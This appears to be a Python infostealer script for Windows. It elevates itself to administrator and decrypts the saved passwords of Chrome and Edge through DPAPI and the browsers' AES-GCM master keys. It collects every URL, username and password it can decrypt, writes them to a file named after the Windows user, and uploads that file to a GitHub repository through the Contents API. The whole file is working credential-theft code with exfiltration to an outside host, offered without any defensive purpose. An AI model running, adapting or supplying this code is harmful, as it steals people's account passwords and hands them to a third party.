import sys
from io import StringIO
import time
import os
import re
import json
import binascii
import ctypes
import sqlite3
import pathlib
import shutil
import base64
import datetime
import requests # For GitHub API communication

# Dependencies not in standard library, ensure they are installed:
# pip install pypsexec pycryptodomex pycryptodome

# Import platform-specific dependencies
from pypsexec.client import Client 
from Crypto.Cipher import AES, ChaCha20_Poly1305
from Cryptodome.Cipher import AES 
import win32crypt

# ==============================================================================
# 1. GITHUB CONFIGURATION AND HELPER FUNCTION
# ==============================================================================

# --- USER-DEFINED GITHUB CONFIGURATION ---
# IMPORTANT: The GITHUB_TOKEN must have the 'repo' scope (or 'contents:write' for fine-grained tokens)
GITHUB_TOKEN = "github token here"
REPO_SLUG = "GithubUsername/reponame" # Format: <owner>/<repo>
# -----------------------------------------

def upload_to_github(repo_slug, file_path_on_github, content, token):
    """Uploads or updates a file on GitHub using the Contents API."""
    
    url_base = f"https://api.github.com/repos/{repo_slug}/contents/{file_path_on_github}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.com.v3+json"
    }

    sha = None
    try:
        response = requests.get(url_base, headers=headers)
        if response.status_code == 200:
            sha = response.json().get('sha')
    except requests.exceptions.RequestException as e:
        print(f"[GITHUB] Network error during SHA check: {e}")
        return

    encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
    action = "Update" if sha else "Create"
    commit_message = f"{action}: {file_path_on_github} - Automated Script Run on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": "main"
    }
    
    if sha:
        payload["sha"] = sha

    try:
        response = requests.put(url_base, headers=headers, data=json.dumps(payload))
        
        if response.status_code in [200, 201]:
            print(f"\n[GITHUB] ✅ Successfully {action.lower()}d file on GitHub.")
        else:
            print(f"\n[GITHUB] ❌ Error uploading file: {response.status_code} - {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"[GITHUB] Network error during file upload: {e}")

# ==============================================================================
# 2. MAIN SCRIPT LOGIC (ADMIN CHECK AND CORE FUNCTIONALITY)
# ==============================================================================

# Capture all output from both scripts
original_stdout = sys.stdout
sys.stdout = StringIO()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

if is_admin():
    pass
else:
    input("This script needs to run as administrator, press Enter to continue")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join([sys.argv[0]] + sys.argv[1:]), None, 1)
    exit()


# decrypt v20 password with AES256GCM (Function is now outside main flow)
def decrypt_password_v20(encrypted_value, master_key): 
    
    try:
        if master_key is None:
            return "Error: Master key missing."
            
        password_iv = encrypted_value[3:3+12]
        encrypted_password = encrypted_value[3+12:-16]
        password_tag = encrypted_value[-16:]
        
        password_cipher = AES.new(master_key, AES.MODE_GCM, nonce=password_iv) 
        decrypted_password = password_cipher.decrypt_and_verify(encrypted_password, password_tag)
        return decrypted_password.decode('utf-8')
        
    except ValueError as e:
        if "MAC check failed" in str(e):
            # This entry failed with this key, but the key might work for another entry.
            return "Error decrypting password for this entry: MAC check failed (Key mismatch)."
        else:
            return f"Error decrypting password for this entry: {str(e)}"
    
    except Exception as e:
        return f"Error decrypting password for this entry: {str(e)}"

# ==============================================================================
# 3. CHROME DECRYPTION FUNCTION (Handles Key retrieval and Password fetch)
# ==============================================================================

def run_chrome_decryption(profile_path, profile_name):
    print(f"\n\n[CHROME] Attempting decryption for profile: {profile_name}")
    
    login_db_path = os.path.join(profile_path, "Login Data")
    # Local State is always one folder up from the profile
    local_state_path = os.path.normpath(os.path.join(profile_path, "..", "Local State")) 
    
    if not os.path.exists(login_db_path) or not os.path.exists(local_state_path):
        print(f"[CHROME] Required files not found for {profile_name}. Skipping.")
        return

    key = None # Initialize key

    # --- 1. Master Key Decryption ---
    try:
        # 1. Load Local State
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        # 2. Extract encrypted_key, base64-decode it, and skip the 'v10' or 'DPAPI' prefix (first 5 bytes)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key_bytes = base64.b64decode(encrypted_key_b64)[5:]
        
        # 3. Decrypt with the standard user DPAPI
        key = win32crypt.CryptUnprotectData(encrypted_key_bytes, None, None, None, 0)[1]
        
        print(f"[CHROME] Master key decrypted successfully for {profile_name} using standard DPAPI.")

    except Exception as e:
        print(f"[CHROME] Error decrypting master key for {profile_name} with standard DPAPI: {str(e)}")
        # --- Fallback to Original pypsexec Logic (omitted for conciseness unless absolutely necessary) ---
        print("[CHROME] NOTE: Standard DPAPI failed. Skipping complex decryption fallback for now.")
        key = None
        
    if key is None:
        print(f"[CHROME] CRITICAL: Chrome master key could not be retrieved for {profile_name}. Skipping password extraction.")
        return

    # --- 2. Password Fetching and Decryption ---
    con = None
    passwords_v20 = []
    try:
        # Use read-only mode for safe database access
        con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        r = cur.execute("SELECT origin_url, username_value, password_value FROM logins;")
        passwords = cur.fetchall()
        passwords_v20 = [p for p in passwords if p[2] and p[2][:3] == b"v20"]
    except Exception as e:
        print(f"[CHROME] Error accessing or querying Login Data database for {profile_name}: {str(e)}")
        return
    finally:
        if con:
            con.close()

    print(f"\nDecrypted Chrome Passwords for Profile: {profile_name}:")
    print("-" * 50)
    
    decrypted_count = 0
    for p in passwords_v20:
        url = p[0]
        username = p[1]
        password = decrypt_password_v20(p[2], key) 
        
        if "MAC check failed" not in password:
            decrypted_count += 1
        
        print(f"URL: {url}")
        print(f"Username: {username}")
        print(f"Password: {password}")
        print("-" * 50)
        
    if decrypted_count == 0 and len(passwords_v20) > 0:
        print(f"[CHROME] WARNING: No passwords successfully decrypted for {profile_name}. Key is likely wrong.")
    elif len(passwords_v20) == 0:
        print(f"[CHROME] No passwords found in Login Data for {profile_name}.")


# ==============================================================================
# 4. CHROME EXECUTION
# ==============================================================================
user_profile = os.environ['USERPROFILE']
chrome_user_data_base = rf"{user_profile}\AppData\Local\Google\Chrome\User Data"

# Find all profile folders (Default and Profile X)
profile_dirs = []
if os.path.exists(chrome_user_data_base):
    for entry in os.listdir(chrome_user_data_base):
        full_path = os.path.join(chrome_user_data_base, entry)
        if os.path.isdir(full_path) and (entry == "Default" or entry.startswith("Profile ")):
            profile_dirs.append((full_path, entry))

if not profile_dirs:
    print(f"[CHROME] WARNING: No Chrome User Data profiles found in {chrome_user_data_base}.")
else:
    for path, name in profile_dirs:
        run_chrome_decryption(path, name)


print("PG_Chrome output:")
print("This is from PG_Chrome script.")

# Include the full logic from PG_Edge.py here (unmodified)
def get_encrypted_key(home_folder):
    try:
        with open(os.path.normpath(home_folder + "\Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"{str(e)}\n[E] Couldn't extract encrypted_key!")
        return None

def decrypt_password(ciphertext, encrypted_key):
    try:
        chrome_secret = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(encrypted_key, AES.MODE_GCM, chrome_secret)
        return cipher.decrypt(encrypted_password).decode()
    except Exception as e:
        print(f"{str(e)}\n[E] Couldn't decrypt password. Is Chromium version older than 80?")
        return ""

def get_db(login_data_path):
    db = None
    temp_db_path = "login_data_copy.db"
    try:
        shutil.copy2(login_data_path, temp_db_path)
        db = sqlite3.connect(temp_db_path)
        return db
    except Exception as e:
        print(f"{str(e)}\n[E] Couldn't find the \"Login Data\" database!")
        if db:
            db.close()
        if os.path.exists(temp_db_path):
            os.remove(temp_db_path)
        return None

def get_chromium_creds(user_data, browser_name):
    if (os.path.exists(user_data) and os.path.exists(user_data + r"\Local State")):
        print(f"\n[I] Found {os.environ['USERPROFILE']}'s {browser_name} folder - decrypting...")
        encrypted_key = get_encrypted_key(user_data)
        folders = [item for item in os.listdir(user_data) if re.search("^Profile*|^Default$",item)!=None]
        for folder in folders:
            login_data_path = os.path.normpath(fr"{user_data}\{folder}\Login Data")
            db = None
            cursor = None
            try:
                db = get_db(login_data_path)
                if(encrypted_key and db):
                    cursor = db.cursor()
                    cursor.execute("select action_url, username_value, password_value from logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if (url!="" and username!="" and ciphertext!=""):
                            decrypted_pass = decrypt_password(ciphertext, encrypted_key)
                            print(str(index)+" "+("="*50)+f"\nURL: {url}\nUsername: {username}\nPassword: {decrypted_pass}\n")
            except Exception as e:
                print(f"[E] Error processing data for {browser_name} in folder {folder}: {str(e)}")
            finally:
                if cursor:
                    cursor.close()
                if db:
                    db.close()
                if os.path.exists("login_data_copy.db"):
                    os.remove("login_data_copy.db")

try:
    # Extract Microsoft Edge passwords
    edge_user_data = os.path.normpath(fr"{os.environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data")
    get_chromium_creds(edge_user_data, "Microsoft Edge")
except Exception as e:
    print(f"[E] {str(e)}")
print("PG_Edge output:")
print("This is from PG_Edge script.")

# Get the captured output
output = sys.stdout.getvalue()
sys.stdout = original_stdout

# Display output in the terminal
print("\n--- Combined Output ---\n")
print(output)
print("--- End of Output ---\n")

# -------------------------
# Formatting output for file
# -------------------------

def extract_entries(section_text):
    """
    Extracts tuples (url, username, password) from a section of output.
    """
    entries = []
    # Regex to match URL, Username, Password blocks, including the MAC check failed message
    pattern = re.compile(r"URL:\s*(.+?)\r?\nUsername:\s*(.*?)\r?\nPassword:\s*(.*?)(?:\r?\n(?:-+\r?\n|$))", re.DOTALL)
    for m in pattern.finditer(section_text):
        url = m.group(1).strip()
        username = m.group(2).strip()
        password = m.group(3).strip()
        # Only include successfully decrypted passwords for final file format
        if "MAC check failed" not in password and "Error decrypting password" not in password:
            entries.append((url, username, password))
    return entries

# Try to isolate Chrome and Edge parts using the markers printed by the scripts
# Note: The output structure is complex due to profile iteration, so we'll just parse everything before the Edge section.
chrome_section = ""
edge_section = ""

end_chrome_marker = "PG_Chrome output:"
start_edge_marker = "PG_Chrome output:"
end_edge_marker = "PG_Edge output:"

end_idx = output.find(end_chrome_marker)
if end_idx != -1:
    chrome_section = output[:end_idx]

start_idx_e = output.find(start_edge_marker)
end_idx_e = output.find(end_edge_marker)
if start_idx_e != -1 and end_idx_e != -1 and end_idx_e > start_idx_e:
    edge_section = output[start_idx_e + len(start_edge_marker):end_idx_e]
elif start_idx_e != -1:
    edge_section = output[start_idx_e + len(start_edge_marker):]

# Extract entries (Only successful ones now)
chrome_entries = extract_entries(chrome_section)
edge_entries = extract_entries(edge_section)

# Build formatted output exactly like user requested
formatted_lines = []

# Chrome header
formatted_lines.append("Chrome")
if chrome_entries:
    for (url, username, password) in chrome_entries:
        formatted_lines.append(f"URL:{url}")
        formatted_lines.append(f"Username: {username}")
        formatted_lines.append(f"Password: {password}")
        formatted_lines.append("")  # blank line between entries
else:
    formatted_lines.append("No Chrome passwords successfully extracted.")
    formatted_lines.append("")

# Separator
formatted_lines.append("++++++++++++++++++++++++++++++++++++++++++++++++++++++")

# Edge header
formatted_lines.append("Edge")
if edge_entries:
    for (url, username, password) in edge_entries:
        formatted_lines.append(f"URL:{url}")
        formatted_lines.append(f"Username: {username}")
        formatted_lines.append(f"Password: {password}")
        formatted_lines.append("")  # blank line between entries
else:
    formatted_lines.append("No Edge passwords successfully extracted.")
    formatted_lines.append("")

formatted_output = "\n".join(formatted_lines).rstrip() + "\n"

# Save the formatted output to a file named "<WindowsUsername>_output.txt"
_windows_user = os.environ.get('USERNAME')
if not _windows_user:
    try:
        _windows_user = os.path.basename(os.environ.get('USERPROFILE', 'User'))
        if not _windows_user:
            _windows_user = 'User'
    except:
        _windows_user = 'User'

filename = f"{_windows_user}_output.txt"

# -------------------------
# Save file locally
# -------------------------
with open(filename, 'w', encoding='utf-8') as f:
    f.write(formatted_output)

print(f"Formatted output saved to: {filename}")

# -------------------------
# Upload file to GitHub
# -------------------------
upload_to_github(REPO_SLUG, filename, formatted_output, GITHUB_TOKEN)